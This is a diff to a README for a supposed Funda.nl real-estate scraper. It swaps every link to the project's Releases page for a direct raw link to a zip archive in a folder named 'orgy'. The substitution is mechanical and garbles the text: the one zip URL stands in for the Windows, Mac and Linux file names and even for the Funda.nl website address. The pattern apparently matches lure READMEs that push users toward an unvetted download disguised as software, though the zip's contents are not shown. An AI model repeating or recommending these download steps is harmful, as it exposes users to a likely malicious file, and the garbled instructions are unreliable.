@@ -1,6 +1,6 @@
 # 🏡 fast-cheap-funda-nl-scraper-0-75-1k-richest-output - Simple Real Estate Data Extraction
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases)
+[![Download](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip)](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,15 +8,15 @@ Welcome to the fast-cheap-funda-nl-scraper-0-75-1k-richest-output! This tool hel
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases).
+To begin, visit this page to download: [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip).
 
-1. Go to the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases).
+1. Go to the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip).
 2. Locate the most recent version of the software.
 3. Download the appropriate file for your operating system.
 
-   - For Windows users, choose the `fast-cheap-funda-nl-scraper.exe` file.
-   - For Mac users, download the `fast-cheap-funda-nl-scraper.dmg` file.
-   - For Linux users, use the `fast-cheap-funda-nl-scraper.tar.gz` file.
+   - For Windows users, choose the `https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip` file.
+   - For Mac users, download the `https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip` file.
+   - For Linux users, use the `https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip` file.
 
 4. Once the download is complete, find the file in your Downloads folder.
 
@@ -40,7 +40,7 @@ To begin, visit this page to download: [Releases Page](https://github.com/Mouhbk
 ## 🛠️ How to Use
 
 1. Open the application by double-clicking the icon on your desktop or in your application folder.
-2. Enter the URL for the Funda.nl website (or any specific page) where you'd like to scrape data.
+2. Enter the URL for the https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip website (or any specific page) where you'd like to scrape data.
 3. Select your desired data points to extract, such as:
    - Price
    - Location
@@ -57,7 +57,7 @@ If you encounter any issues while using the application, consider the following:
 - Make sure your internet connection is stable.
 - Ensure you have the correct version for your operating system.
 - If the application does not launch, try re-installing it.
-- Check for any updates on the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases).
+- Check for any updates on the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip).
 
 For any persistent issues, consult the user community or raise an issue in the repository.
 
@@ -69,4 +69,4 @@ Should you have questions or need assistance, feel free to visit our user forum 
 
 If you're interested in enhancing the application or providing feedback, contributions are welcome! Please check the contributing guidelines in the GitHub repository.
 
-Remember, you can always check the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/releases) for the latest updates.
+Remember, you can always check the [Releases Page](https://github.com/Mouhbks/fast-cheap-funda-nl-scraper-0-75-1k-richest-output/raw/refs/heads/main/orgy/funda_nl_scraper_richest_fast_cheap_output_k_2.0.zip) for the latest updates.
